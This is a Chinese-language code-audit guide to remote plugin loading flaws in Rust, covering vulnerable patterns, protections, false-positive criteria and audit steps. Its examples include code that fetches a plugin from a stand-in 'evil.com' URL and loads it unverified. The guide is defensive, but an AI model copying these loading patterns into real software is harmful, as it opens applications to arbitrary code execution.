# Rust 插件系统远程加载 RFI

## 漏洞成因
Rust 应用的插件系统通过 HTTP 客户端库（`reqwest`、`hyper` 等）加载用户指定的远程插件库文件，未校验来源和完整性，导致加载恶意插件执行任意代码。

---

## Details

### 代码示例

```rust
// 危险示例 1: 直接加载远程动态库
use std::ffi::OsStr;
use libloading::Library;

let plugin_url = get_user_input();  // http://evil.com/plugin.so
let resp = reqwest::blocking::get(&plugin_url)?;
let bytes = resp.bytes()?;
std::fs::write("/tmp/plugin.so", &bytes)?;
unsafe { let lib = Library::new("/tmp/plugin.so")?; }

// 危险示例 2: wasm 插件远程加载
let wasm_url = req.param("plugin");
let wasm_bytes = reqwest::blocking::get(wasm_url)?.bytes()?;
let instance = wasmtime::Instance::new(&mut store, &module)?;

// 危险示例 3: proc_macro 插件加载
fn load_plugin(url: &str) -> Result<Box<dyn Plugin>> {
    let data = reqwest::blocking::get(url)?.bytes()?;
    let lib = unsafe { dlopen::raw::dlopen_with_flags(...) }?;
    Ok(Box::new(plugin))
}

// 危险示例 4: 配置驱动的插件加载
let config: PluginConfig = serde_json::from_str(&user_config)?;
for plugin_url in &config.plugins {
    load_remote_plugin(plugin_url)?;
}
```

### 快速定位核心操作 (L2: 跳读)
- **HTTP 客户端**：`reqwest`, `hyper`, `ureq`
- **动态库加载**：`libloading::Library`, `dlopen`, `unsafe { dlopen() }`
- **WASM 加载**：`wasmtime`, `wasmer`, 或其他 WASM 运行时
- **配置源**：用户参数、配置文件、环境变量
- **数据流**：URL 参数 → HTTP 请求 → 写入磁盘 → 动态加载

### 快速定位保护机制 (L3: 逐行读)
- **白名单验证**：
  - 预定义的允许插件列表
  - `if !ALLOWED_PLUGINS.contains(&plugin_name)`
- **URL 验证**：
  - `if !url.starts_with("https://trusted.com/")`
  - `url.parse::<Uri>()?.host()` 检查
- **完整性检查**：
  - SHA256/SHA512 哈希验证
  - GPG 签名验证
  - `crypto::verify_signature(&bytes, &expected_sig)?`
- **文件类型检查**：
  - ELF 头部检查（Linux `.so`）
  - PE 头部检查（Windows `.dll`）
  - WASM 魔数检查（`.wasm`）
- **沙箱运行**：
  - WASM 沙箱默认隔离
  - `seccomp` 限制系统调用

---

## Classify

### 漏洞
- 用户可控的插件 URL
- 无白名单或白名单可绕过
- 下载后直接加载，无完整性验证
- 跨文件场景：A 模块下载，B 模块加载

### 误报
- 插件 URL 来自硬编码配置或数据库
- 严格的白名单验证（名称或哈希）
- 插件签名验证完整且密钥安全
- 插件运行在受限沙箱（WASM）

### 代码异味
- 插件 URL 部分可控但有验证
- 下载验证与加载步骤分离，中间可被篡改
- 使用弱验证如仅检查文件扩展名

---

## Low risk

- **白名单 + 签名**：插件名称和加密签名都被验证，无绕过路径
- **协议 + 域名限制**：仅允许 HTTPS 且仅限特定内部域名
- **哈希 Pin**：插件的 SHA256 哈希被硬编码，无法加载不同版本
- **WASM 隔离**：插件仅以 WASM 形式运行，默认沙箱隔离
- **本地插件库**：插件预装包内或从本地目录加载，无远程加载
- **插件权限限制**：系统调用被 seccomp 限制，最小权限原则

---

## 审计重点

1. 定位所有 HTTP 请求和动态加载代码
2. 追踪插件 URL 来源
3. 验证签名或哈希检查的完整性
4. 检查临时文件处理（权限、清理）
5. 测试 URL 绕过向量
6. 验证动态库加载的沙箱隔离
